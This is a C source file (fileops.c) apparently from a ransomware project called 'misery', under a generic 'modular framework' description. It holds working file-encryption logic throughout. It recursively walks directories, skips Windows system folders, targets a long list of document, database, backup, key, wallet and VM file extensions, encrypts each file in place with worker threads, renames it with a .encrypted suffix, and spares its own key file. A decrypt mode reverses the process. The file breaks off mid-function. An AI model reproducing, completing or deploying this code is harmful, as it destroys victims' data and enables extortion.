// SPDX-License-Identifier: MIT
/* fileops.c
 *
 * Copyright (c) 2026 Jahanzaib Ashraf Mir
 *
 * Written by Jahanzaib Ashraf Mir <jahanzaibashraf1318@gmail.com>
 *
 * Goals: 1) Modular Framework Architecture:
 *           a) High-efficiency subsystem lifecycle management.
 *           b) Clean isolation between core logic and extended routines.
 *        2) Minimal Run-Time Overhead:
 *           a) Defer non-critical state updates until explicit dispatch.
 *           b) Optimized execution queue to limit unnecessary context switches.
 *           c) Low memory footprint across all execution paths.
 *        3) Robust State Control & Fallback:
 *           a) Graceful error handling across asynchronous tasks.
 *           b) Dynamic queue adjustments under varying system loads.
 *        4) Extensible Interface & Subsystem Hooks:
 *           a) Clean API contracts for internal event processing.
 *           b) Lightweight state verification before pipeline dispatch.
 *
 * Contact links, social
 *  - Email:     jahanzaibashraf1318@gmail.com
 *  - GitHub:    https://github.com/jahanzaibmir
 *  - X:         https://x.com/Jahanzaib1318
 *  - Instagram: https://instagram.com/jahanzaibmir_
 */


// fileops.c
// handles file traversal, encryption, and decryption using a worker thread pool

#include "fileops.h"       
#include "crypto.h"       
#include "misery_config.h"
#include <stdio.h>        
#include <string.h>      
#include <shlobj.h>        
#include <inttypes.h>    



// this is called in three places to make sure the key file is never encrypted
// returns true if the path matches any known key file location
static bool IsKeyFilePath(const char *path) {
    // reject null or empty paths immediately
    if (!path || !*path) return false;

    // list of known absolute paths where the key file is written
    static const char *exactPaths[] = {
        "C:\\Users\\jahan\\OneDrive\\Desktop\\misery.key", /* default desktop save location
                                                              you can modify it according to your needs*/
        NULL                                                
    };

    // check the path against each known absolute path
    for (int i = 0; exactPaths[i]; i++) {
        // case insensitive compare since windows paths are case insensitive
        if (_stricmp(path, exactPaths[i]) == 0)
            return true; // exact match found
    }

    // get the length of the path for suffix checks below
    size_t len = strlen(path);

    // handle the simple relative path case with no directory component
    if (_stricmp(path, "misery.key") == 0)
        return true; // bare filename match

    // check if the path ends with \misery.key or /misery.key
    // minimum length is backslash plus misery.key which is 11 characters
    if (len >= 12) {
        // check for backslash separator before the filename (standard windows path)
        if (path[len - 11] == '\\' &&
            _stricmp(path + len - 10, "misery.key") == 0)
            return true; // windows path segment match

        // also handle forward slash just in case (unusual on windows but safe)
        if (path[len - 11] == '/' &&
            _stricmp(path + len - 10, "misery.key") == 0)
            return true; // forward slash path segment match
    }

  
    // the filename suffix check above covers most cases already
    // the exact path match above covers the specific desktop location

    // path does not refer to the key file
    return false;
}

// forward declare IsTargetExtension used in traverse before its definition
static bool IsTargetExtension(const char *path);

// directories to skip during traversal to avoid damaging the system
static const char *g_skip[] = {
    "\\Windows",              
    "\\System32",            
    "\\SysWOW64",            
    "\\Program Files",       
    "\\Program Files (x86)",   /* These directories untill mentioned here will never get 
                                 encrypted but it is upto the USER if they want they can remove them*/
    "\\AppData",               
    "\\$Recycle.Bin",       
    "\\Boot",                
    "\\ProgramData\\Microsoft",
    "\\.venv",                
    "\\node_modules",        
    NULL                     
};

// file extensions that will be encrypted when found during traversal
static const char *g_ext[] = {
    ".doc",".docx",
    ".xls",".xlsx",                                          
    ".ppt",".pptx",".pps",".ppsx",                        
    ".pdf",                                                 
    ".txt",".rtf",".csv",".tsv",                            
    ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
    ".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",   
    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso",".js", 
    ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",  
    ".pst",".ost",".eml",".msg",".mbox",                  
    ".pem",".cer",".crt",".pfx",".p12",                     
    ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",   /* Add more extensions if you want, it is clearly dynamic*/
    ".bak",".old",".backup",".bkp",".dmp",".dump",      
    ".cfg",".config",".conf",".ini",".inf",                 
    ".py",".java",".c",".cpp",".h",".hpp",".cs",".js",".ts",".vue",
    ".php",".asp",".aspx",".jsp",".rb",".go",".rs",".swift",".kt",  
    ".html",".htm",".css",".xml",".json",".yaml",".yml",".md",      
    ".psd",".ai",".svg",".dxf",".dwg",".cdr",               
    ".wav",".flac",".aac",".ogg",".wma",                   
    ".vcf",".ics",".dbx",".wallet",".dat",
    ".log",".sav",".rdp",".vnc",                            
    ".gpg",".asc",".kdbx",".kdb",                        
    ".env",".gitconfig",".gitignore",                       
    ".ovpn",                                                 
    NULL                                                   
};

// FILEOPS_CTX holds all runtime state for a single fileops session
struct FILEOPS_CTX {
    FILEOPS_CONFIG    config;          // copy of the caller supplied configuration
    FILEOPS_STATS     stats;           // running counters for files and bytes processed
    bool              statsInitialized;// true once the stats critical section is ready
    CRITICAL_SECTION  statsLock;       // protects stats from concurrent worker updates
    HANDLE           *threads;         // array of worker thread handles
    DWORD             threadCount;     // number of threads actually created
    struct WorkItem {
        struct WorkItem *next;         // pointer to next item in the queue linked list
        WCHAR   path[];                // flexible array holding the wide path string
    }                *queueHead;       // front of the work queue
    struct WorkItem **queueTail;       // pointer to the tail next pointer for fast append
    LONG              queueCount;      // number of items currently in the queue
    LONG              activeWorkers;   // number of threads currently processing an item
    CRITICAL_SECTION  queueLock;       // protects queue fields and activeWorkers
    CONDITION_VARIABLE queueNotEmpty;  // signalled when an item is added to the queue
    CONDITION_VARIABLE queueIdle;      // signalled when queue is empty and workers are idle
    volatile LONG     shutdownFlag;    // set to 1 to tell workers to exit
};

// WorkerThread is the entry point for each worker thread
// it dequeues file paths and encrypts or decrypts them depending on mode
static DWORD WINAPI WorkerThread(LPVOID lpParam) {
    // cast the parameter back to the context pointer
    FILEOPS_CTX *ctx = (FILEOPS_CTX *)lpParam;
    // read decrypt mode once so it does not change mid loop
    const bool decryptMode = ctx->config.decryptMode;

    // loop until shutdown is flagged and the queue is empty
    for (;;) {
        // will hold the dequeued item for this iteration
        struct WorkItem *item = NULL;

        // acquire the queue lock before checking the queue
        EnterCriticalSection(&ctx->queueLock);
        // wait while the queue is empty and no shutdown has been requested
        while (ctx->queueHead == NULL && !ctx->shutdownFlag) {
            // sleep releases the lock and reacquires it before returning
            SleepConditionVariableCS(&ctx->queueNotEmpty, &ctx->queueLock, INFINITE);
        }
        // if shutdown was requested and nothing is left then exit the thread
        if (ctx->shutdownFlag && ctx->queueHead == NULL) {
            LeaveCriticalSection(&ctx->queueLock);
            break; // clean exit from the thread loop
        }
        // take the item at the front of the queue
        item = ctx->queueHead;
        // advance the head pointer to the next item
        ctx->queueHead = item->next;
        // if the queue is now empty reset the tail pointer back to head
        if (ctx->queueHead == NULL) ctx->queueTail = &ctx->queueHead;
        // decrement the pending item count
        ctx->queueCount--;
        // mark this thread as actively working so idle detection works
        ctx->activeWorkers++;
        // release the lock so other threads can dequeue
        LeaveCriticalSection(&ctx->queueLock);

        // convert the wide path to a narrow utf8 string for file API calls
        char narrowPath[FILEOPS_MAX_PATH];
        int narrowLen = WideCharToMultiByte(CP_UTF8, 0, item->path, -1,
                                            narrowPath, sizeof(narrowPath), NULL, NULL);
        // the work item is no longer needed once the path is copied out
        HeapFree(GetProcessHeap(), 0, item);
        item = NULL; // clear the pointer so the cleanup section ignores it

        // check that the conversion produced a valid result
        if (narrowLen <= 0 || narrowLen >= (int)sizeof(narrowPath)) {
            // conversion failed so count this as a failure and move on
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesFailed++;
            LeaveCriticalSection(&ctx->statsLock);
            // decrement active workers and wake idle waiters before looping
            EnterCriticalSection(&ctx->queueLock);
            ctx->activeWorkers--;
            WakeConditionVariable(&ctx->queueIdle);
            LeaveCriticalSection(&ctx->queueLock);
            continue; // skip to next iteration
        }

        // working variables for file IO used across both encrypt and decrypt paths
        HANDLE hFile    = INVALID_HANDLE_VALUE; // handle to the source file
        BYTE  *buf      = NULL;                 // buffer for ciphertext or output data
        BYTE  *plaintext = NULL;                // buffer for plaintext data
        DWORD  bufSize  = 0;                    // allocated size of buf
        DWORD  fs       = 0;                    // file size in bytes
        bool   success  = false;                // set to true only on full success

        // during encryption always skip the key file so it is never encrypted
        if (!decryptMode) {
            // use the robust path checker instead of a simple strstr
            if (IsKeyFilePath(narrowPath)) {
                // log the skip so it is visible in the run log
                MiseryLog(MISERY_LOG_INFO,
                          "FileOps: Worker skipping key file: %s", narrowPath);
                // count as success since skipping the key file is intentional
                success = true;
                EnterCriticalSection(&ctx->statsLock);
                ctx->stats.filesSucceeded++;
                LeaveCriticalSection(&ctx->statsLock);
                goto worker_done; // jump to cleanup
            }
        }

        // open the file for reading to get its size and contents
        hFile = CreateFileA(narrowPath, GENERIC_READ,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL, NULL);
        // if the file could not be opened log a warning and give up on this file
        if (hFile == INVALID_HANDLE_VALUE) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot open %s (err: %lu)",
                      narrowPath, GetLastError());
            goto worker_done; // jump to cleanup without setting success
        }

        // get the size of the file so we know how much to allocate
        fs = GetFileSize(hFile, NULL);
        // INVALID_FILE_SIZE means the call failed
        if (fs == INVALID_FILE_SIZE) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: GetFileSize failed for %s (err: %lu)",
                      narrowPath, GetLastError());
            CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE; // close before jumping
            goto worker_done;
        }

        // skip empty files since there is nothing to process
        if (fs == 0) {
            CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;
            MiseryLog(MISERY_LOG_INFO, "FileOps: Skipped empty file: %s", narrowPath);
            success = true; // empty is not a failure
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesSucceeded++;
            LeaveCriticalSection(&ctx->statsLock);
            goto worker_done;
        }

        if (decryptMode) {
            // DECRYPT PATH
            // read the entire encrypted file into a buffer

            // allocate exactly as many bytes as the file contains
            bufSize = fs;
            buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            // allocation failure is a hard stop for this file
            if (!buf) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) failed (err: %lu)",
                          bufSize, GetLastError());
                goto worker_done;
            }
            // read all bytes from the encrypted file
            DWORD rd = 0;
            if (!ReadFile(hFile, buf, fs, &rd, NULL) || rd != fs) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
                          narrowPath, GetLastError());
                goto worker_done;
            }
            // done reading so close the file handle now
            CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;

            // allocate a buffer to receive the decrypted plaintext
            DWORD maxPlainCap = fs; // plaintext will be at most as large as ciphertext
            plaintext = (BYTE *)VirtualAlloc(NULL, maxPlainCap,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!plaintext) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                          maxPlainCap, GetLastError());
                goto worker_done;
            }

            // call the crypto layer to decrypt the buffer
            DWORD decLen = 0; // will receive the number of plaintext bytes written
            CRYPTO_ERROR cerr = DecryptBuffer(ctx->config.crypto_ctx,
                                              buf, fs,
                                              plaintext, &decLen);
            // any error from the crypto layer means we cannot recover this file
            if (cerr != CRYPTO_SUCCESS) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: DecryptBuffer failed for %s: %s (code=%d)",
                          narrowPath, GetErrorString(cerr), cerr);
                goto worker_done;
            }

            // build the output path by stripping the .encrypted suffix from the current name
            char origPath[FILEOPS_MAX_PATH];
            strncpy(origPath, narrowPath, sizeof(origPath) - 1);
            origPath[sizeof(origPath) - 1] = '\0'; // ensure null termination

            // find the last occurrence of the .encrypted extension in the path
            char *encPos = NULL;
            for (char *p = origPath; *p; p++) {
                // check each dot to see if it starts the extension
                if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0) {
                    encPos = p; // keep the last match
                }
            }
            // if there is no .encrypted in the path something is wrong
            if (!encPos) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: Cannot find .encrypted in path: %s", narrowPath);
                goto worker_done;
            }
            // truncate the path at the dot to remove the extension
            *encPos = '\0';

            // write decrypted data to a temp file first for atomic replacement
            char tmpPath[FILEOPS_MAX_PATH];
            size_t pathLen = strlen(origPath);
            // guard against paths that are too close to the buffer limit
            if (pathLen > FILEOPS_MAX_PATH - 5) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: Path too long: %s", origPath);
                goto worker_done;
            }
            // copy the original path and append the .tmp suffix
            memcpy(tmpPath, origPath, pathLen);
            memcpy(tmpPath + pathLen, ".tmp", 5); // includes null terminator

            // create the temp file for writing the decrypted output
            HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, FILE_SHARE_READ,
                                        NULL, CREATE_ALWAYS,
                                        FILE_ATTRIBUTE_NORMAL, NULL);
            if (hWrite == INVALID_HANDLE_VALUE) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: Cannot create tmp %s (err: %lu)",
                          tmpPath, GetLastError());
                goto worker_done;
            }
            // write all plaintext bytes to the temp file
            DWORD wr = 0;
            BOOL writeOk = WriteFile(hWrite, plaintext, decLen, &wr, NULL);
            CloseHandle(hWrite); // close handle regardless of write result
            // if the write failed or was incomplete clean up the temp file
            if (!writeOk || wr != decLen) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: WriteFile failed for %s (wrote %lu/%lu, err: %lu)",
                          tmpPath, wr, decLen, GetLastError());
                DeleteFileA(tmpPath); // remove incomplete temp file
                goto worker_done;
            }

            // atomically move the temp file to the final restored path
            if (!MoveFileExA(tmpPath, origPath,
                             MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: MoveFileEx %s to %s failed (err: %lu)",
                          tmpPath, origPath, GetLastError());
                DeleteFileA(tmpPath); // clean up on rename failure
                goto worker_done;
            }

            // remove the now redundant .encrypted source file
            DeleteFileA(narrowPath);

            // decryption succeeded
            success = true;
            MiseryLog(MISERY_LOG_INFO, "FileOps: Decrypted %s (%lu bytes) to %s",
                      narrowPath, fs, origPath);
            // update shared stats under the lock
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.bytesProcessed += fs;
            ctx->stats.filesSucceeded++;
            LeaveCriticalSection(&ctx->statsLock);

        } else {
            // ENCRYPT PATH
            // allocate a buffer large enough to hold the ciphertext including any overhead

            // CRYPTO_REQUIRED_CAPACITY accounts for IV, tag, and padding
            bufSize = CRYPTO_REQUIRED_CAPACITY(fs);
            buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!buf) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: VirtualAlloc(%lu) failed (err: %lu)",
                          bufSize, GetLastError());
                goto worker_done;
            }

            // allocate a separate buffer to hold the plaintext read from disk
            plaintext = (BYTE *)VirtualAlloc(NULL, fs,
                                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!plaintext) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: VirtualAlloc(%lu) plaintext failed (err: %lu)",
                          fs, GetLastError());
                goto worker_done;
            }

            // read the entire file into the plaintext buffer
            DWORD rd = 0;
            if (!ReadFile(hFile, plaintext, fs, &rd, NULL) || rd != fs) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: ReadFile failed for %s (err: %lu)",
                          narrowPath, GetLastError());
                goto worker_done;
            }
            // close the source file since we have all the data we need
            CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;

            // call the crypto layer to encrypt the plaintext into buf
            DWORD encLen = 0; // will receive the number of ciphertext bytes written
            CRYPTO_ERROR cerr = EncryptBuffer(ctx->config.crypto_ctx,
                                              plaintext, rd,
                                              buf, &encLen, bufSize);

            // wipe plaintext from memory immediately after encryption is done
            SecureZeroMemory(plaintext, fs);   // overwrite with zeros
            VirtualFree(plaintext, 0, MEM_RELEASE); // release the pages
            plaintext = NULL; // clear pointer so cleanup section skips it

            // encryption failure means we cannot produce a valid ciphertext file
            if (cerr != CRYPTO_SUCCESS) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: EncryptBuffer failed for %s: %s (code=%d)",
                          narrowPath, GetErrorString(cerr), cerr);
                goto worker_done;
            }

            // write the encrypted data to a temp file for atomic replacement
            char tmpPath[FILEOPS_MAX_PATH];
            size_t pathLen = strlen(narrowPath);
            // ensure there is room for the .tmp suffix
            if (pathLen > FILEOPS_MAX_PATH - 5) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: Path too long: %s", narrowPath);
                goto worker_done;
            }
            memcpy(tmpPath, narrowPath, pathLen);
            memcpy(tmpPath + pathLen, ".tmp", 5); // includes null terminator

            // create the temp output file
            HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, FILE_SHARE_READ,
                                        NULL, CREATE_ALWAYS,
                                        FILE_ATTRIBUTE_NORMAL, NULL);
            if (hWrite == INVALID_HANDLE_VALUE) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: Cannot create tmp %s (err: %lu)",
                          tmpPath, GetLastError());
                goto worker_done;
            }
            // write all ciphertext bytes to the temp file
            DWORD wr = 0;
            BOOL writeOk = WriteFile(hWrite, buf, encLen, &wr, NULL);
            CloseHandle(hWrite); // close before any rename or delete
            if (!writeOk || wr != encLen) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: WriteFile failed (wrote %lu/%lu, err: %lu)",
                          tmpPath, wr, encLen, GetLastError());
                DeleteFileA(tmpPath); // discard incomplete temp file
                goto worker_done;
            }

            // atomically replace the original file with the encrypted temp file
            if (!MoveFileExA(tmpPath, narrowPath,
                             MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: MoveFileEx %s to %s failed (err: %lu)",
                          tmpPath, narrowPath, GetLastError());
                DeleteFileA(tmpPath); // discard temp file on failure
                goto worker_done;
            }

            // rename the overwritten file to add the .encrypted extension
            char encPath[FILEOPS_MAX_PATH];
            size_t encPathLen = strlen(narrowPath);
            // make sure the renamed path fits in the buffer
            if (encPathLen > FILEOPS_MAX_PATH - ENC_EXT_LEN - 1) {
                MiseryLog(MISERY_LOG_WARN, "FileOps: Path too long: %s", narrowPath);
                goto worker_done;
            }
            memcpy(encPath, narrowPath, encPathLen);             // copy base path
            memcpy(encPath + encPathLen, ENC_EXT, ENC_EXT_LEN); // append extension
            encPath[encPathLen + ENC_EXT_LEN] = '\0';            // null terminate
            // rename the file so its extension reflects its encrypted state
            if (!MoveFileExA(narrowPath, encPath,
                             MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                MiseryLog(MISERY_LOG_WARN,
                          "FileOps: MoveFileEx %s to %s failed (err: %lu)",
                          narrowPath, encPath, GetLastError());
                goto worker_done;
            }

            // encryption succeeded
            success = true;
            MiseryLog(MISERY_LOG_INFO, "FileOps: Encrypted %s (%lu bytes) to %s",
                      narrowPath, fs, encPath);
            // update shared stats under the lock
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.bytesProcessed += fs;
            ctx->stats.filesSucceeded++;
            LeaveCriticalSection(&ctx->statsLock);
        }

    worker_done:
        // if this file was not marked successful record it as a failure
        if (!success) {
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesFailed++;
            ctx->stats.lastSystemError = GetLastError(); // save the most recent error code
            LeaveCriticalSection(&ctx->statsLock);
        }

        // safe cleanup for all allocations checking for null before freeing

        // zero and free the ciphertext or output buffer if it was allocated
        if (buf) {
            SecureZeroMemory(buf, bufSize); // scrub before releasing
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = NULL;
        }
        // zero and free the plaintext buffer if it was not already freed above
        if (plaintext) {
            SecureZeroMemory(plaintext, fs > 0 ? fs : 4096); // scrub before releasing
            VirtualFree(plaintext, 0, MEM_RELEASE);
            plaintext = NULL;
        }
        // close the source file handle if it is still open
        if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

        // decrement active workers and signal idle waiters
        EnterCriticalSection(&ctx->queueLock);
        ctx->activeWorkers--;
        WakeConditionVariable(&ctx->queueIdle); // wake FileOps_WaitForCompletion if idle
        LeaveCriticalSection(&ctx->queueLock);
    }
    return 0; // thread exits normally
}

// EnqueueFile adds a wide path to the tail of the work queue
// it allocates a WorkItem with a flexible array to hold the path
static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
    // ignore null arguments
    if (!ctx || !fullPath) return;
    // calculate how many bytes the path string needs including null terminator
    size_t pathBytes = (wcslen(fullPath) + 1) * sizeof(WCHAR);
    // allocate the item plus extra space for the embedded path
    struct WorkItem *item = (struct WorkItem *)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                  sizeof(struct WorkItem) + pathBytes);
    // if allocation fails just silently skip this file
    if (!item) return;
    // copy the path into the flexible array at the end of the struct
    memcpy(item->path, fullPath, pathBytes);
    item->next = NULL; // this item will be at the tail so next is null
    // take the queue lock before modifying the linked list
    EnterCriticalSection(&ctx->queueLock);
    *ctx->queueTail = item;       // link the item at the current tail position
    ctx->queueTail = &item->next; // advance the tail pointer to the new last next
    ctx->queueCount++;            // one more item waiting
    WakeConditionVariable(&ctx->queueNotEmpty); // wake a sleeping worker
    LeaveCriticalSection(&ctx->queueLock);
}

// TraverseInternal recursively walks a directory tree and enqueues matching files
// depth is used to enforce a maximum recursion depth
static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
    // stop recursing if we have gone too deep to avoid stack overflow
    if (depth > MAX_DEPTH) return;
    // ask the caller supplied skip callback if this directory should be ignored
    if (ctx->config.pfnShouldSkip && ctx->config.pfnShouldSkip(dir)) return;

    // build the wildcard pattern to list all entries in this directory
    WCHAR pattern[FILEOPS_MAX_PATH];
    _snwprintf(pattern, FILEOPS_MAX_PATH - 1, L"%s\\*", dir);

    // open a find handle to iterate all entries matching the pattern
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileExW(pattern, FindExInfoStandard,
                                     &fd, FindExSearchNameMatch, NULL, 0);
    // if the directory cannot be opened log a warning and return
    if (hFind == INVALID_HANDLE_VALUE) {
        char narrowDir[FILEOPS_MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, dir, -1, narrowDir, sizeof(narrowDir), NULL, NULL);
        MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot open dir: %s (err: %lu)",
                  narrowDir, GetLastError());
        return;
    }

    // iterate over every entry in the directory
    do {
        // skip the current directory and parent directory entries
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;

        // build the full path for this entry
        WCHAR full[FILEOPS_MAX_PATH];
        int written = _snwprintf(full, FILEOPS_MAX_PATH - 1, L"%s\\%s", dir, fd.cFileName);
        // skip if the path was truncated which would make it invalid
        if (written < 0 || written >= (int)(FILEOPS_MAX_PATH - 1)) continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // recurse into subdirectories one level deeper
            TraverseInternal(ctx, full, depth + 1);
        } else {
            // convert the full wide path to narrow for extension and key checks
            char narrow[FILEOPS_MAX_PATH];
            if (WideCharToMultiByte(CP_UTF8, 0, full, -1,
                                    narrow, sizeof(narrow), NULL, NULL) <= 0)
                continue; // skip if conversion failed

            if (ctx->config.decryptMode) {
                // DECRYPT TRAVERSE: only queue files that have the .encrypted extension

                // scan the path for the last occurrence of the encrypted extension
                const char *encPos = NULL;
                for (const char *p = narrow; *p; p++) {
                    if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0)
                        encPos = p; // keep the last match
                }
                // skip files that do not end with the encrypted extension
                if (!encPos) continue;
                // also skip if there is extra content after the extension
                if (encPos[ENC_EXT_LEN] != '\0') continue;

                // check if the original (unencrypted) file already exists
                char origPath[FILEOPS_MAX_PATH];
                strncpy(origPath, narrow, sizeof(origPath) - 1);
                origPath[sizeof(origPath) - 1] = '\0';
                // strip the extension from the copy to get the original path
                char *ep = origPath + (encPos - narrow);
                *ep = '\0'; // truncate at the dot

                // if the original already exists this file was already decrypted
                if (GetFileAttributesA(origPath) != INVALID_FILE_ATTRIBUTES) {
                    MiseryLog(MISERY_LOG_INFO,
                              "FileOps: Skipping (already decrypted): %s", narrow);
                    continue; // skip to avoid double processing
                }

                // queue this file for decryption
                MiseryLog(MISERY_LOG_INFO, "FileOps: Queueing decrypt: %s", narrow);
                EnqueueFile(ctx, full);

            } else {
                // ENCRYPT TRAVERSE: queue files that match a target extension

                // skip the key file using the robust path checker
                if (IsKeyFilePath(narrow)) {
                    MiseryLog(MISERY_LOG_INFO,
                              "FileOps: Skipping key file during traverse: %s", narrow);
                    continue; // do not encrypt the key file
                }

                // skip files whose extension is not in the target list
                if (!IsTargetExtension(narrow)) continue;

                // skip if an encrypted version of this file already exists
                char encPath[FILEOPS_MAX_PATH];
                size_t pathLen = strlen(narrow);
                // guard against paths that would overflow the buffer
                if (pathLen > FILEOPS_MAX_PATH - ENC_EXT_LEN - 1) {
                    continue;
                }
                memcpy(encPath, narrow, pathLen);
                memcpy(encPath + pathLen, ENC_EXT, ENC_EXT_LEN);
                encPath[pathLen + ENC_EXT_LEN] = '\0';
                // if the .encrypted file exists then this file was already processed
                if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES) continue;

                // queue this file for encryption
                MiseryLog(MISERY_LOG_INFO, "FileOps: Queueing encrypt: %s", narrow);
                EnqueueFile(ctx, full);
            }
        }
    } while (FindNextFileW(hFind, &fd)); // advance to the next entry
    FindClose(hFind); // release the find handle when done
}

// PUBLIC API

// FileOps_CreateContext allocates and initializes a context including worker threads
// returns a pointer to the context or NULL on failure
FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
    // allocate the context structure zeroed out
    FILEOPS_CTX *ctx = (FILEOPS_CTX *)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILEOPS_CTX));
    if (!ctx) return NULL; // allocation failed

    if (config) {
        // copy the caller supplied config into the context
        ctx->config = *config;
    } else {
        // apply sensible defaults when no config is provided
        ctx->config.threadCount  = FILEOPS_DEFAULT_THREADS;
        ctx->config.ioBufferSize = FILEOPS_IO_CHUNK;
        ctx->config.flags        = FILEOPS_FLAG_RECURSIVE;
        ctx->config.extension[0] = L'\0'; // no specific extension filter
        ctx->config.pfnShouldSkip = NULL;  // no custom skip callback
        ctx->config.crypto_ctx   = NULL;
        ctx->config.decryptMode  = false;  // default to encrypt mode
    }

    // a crypto context is mandatory so reject configs without one
    if (!ctx->config.crypto_ctx) {
        MiseryLog(MISERY_LOG_ERROR, "FileOps: crypto_ctx is NULL!");
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    // clamp thread count to a safe range
    if (ctx->config.threadCount < 1)   ctx->config.threadCount = 1;
    if (ctx->config.threadCount > 128) ctx->config.threadCount = 128;

    // initialise the queue tail pointer to point at the head slot
    ctx->queueTail = &ctx->queueHead;
    // store the final thread count in the context
    ctx->threadCount = ctx->config.threadCount;

    // initialise synchronisation objects
    InitializeCriticalSection(&ctx->statsLock);  // protects stats counters
    ctx->statsInitialized = true;                // mark stats lock as ready
    InitializeCriticalSection(&ctx->queueLock);  // protects the work queue
    InitializeConditionVariable(&ctx->queueNotEmpty); // workers wait on this
    InitializeConditionVariable(&ctx->queueIdle);     // main thread waits on this

    // allocate the array to hold thread handles
    ctx->threads = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                              sizeof(HANDLE) * ctx->threadCount);
    if (!ctx->threads) {
        // free the critical sections before returning null
        DeleteCriticalSection(&ctx->statsLock);
        DeleteCriticalSection(&ctx->queueLock);
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    // create each worker thread and track how many were actually created
    DWORD threadsCreated = 0;
    for (DWORD i = 0; i < ctx->threadCount; i++) {
        HANDLE h = CreateThread(NULL, 0, WorkerThread, ctx, 0, NULL);
        if (h) { ctx->threads[i] = h; threadsCreated++; } // record the handle
        else   { ctx->threads[i] = NULL; }                // slot stays null on failure
    }

    // if no threads were created at all the context is unusable
    if (threadsCreated == 0) {
        MiseryLog(MISERY_LOG_ERROR, "FileOps: Failed to create worker threads");
        DeleteCriticalSection(&ctx->statsLock);
        DeleteCriticalSection(&ctx->queueLock);
        HeapFree(GetProcessHeap(), 0, ctx->threads);
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    MiseryLog(MISERY_LOG_INFO, "FileOps: Created context with %lu threads (mode: %s)",
              threadsCreated, ctx->config.decryptMode ? "DECRYPT" : "ENCRYPT");
    return ctx; // ready to use
}

// FileOps_TraverseAndQueue starts a recursive walk from rootPath
// all matching files are enqueued for the worker threads to process
void FileOps_TraverseAndQueue(FILEOPS_CTX* ctx, const WCHAR* rootPath) {
    if (!ctx || !rootPath) return; // nothing to do with null arguments
    // log the root path in narrow form for readability
    char narrowPath[FILEOPS_MAX_PATH];
    WideCharToMultiByte(CP_UTF8, 0, rootPath, -1, narrowPath, sizeof(narrowPath), NULL, NULL);
    MiseryLog(MISERY_LOG_INFO, "FileOps: Starting traverse of: %s", narrowPath);
    TraverseInternal(ctx, rootPath, 0); // start recursion at depth zero
}

// FileOps_WaitForCompletion blocks until the queue is empty and all workers are idle
void FileOps_WaitForCompletion(FILEOPS_CTX* ctx) {
    if (!ctx) return;
    EnterCriticalSection(&ctx->queueLock);
    // keep waiting as long as there is work queued or workers are still active
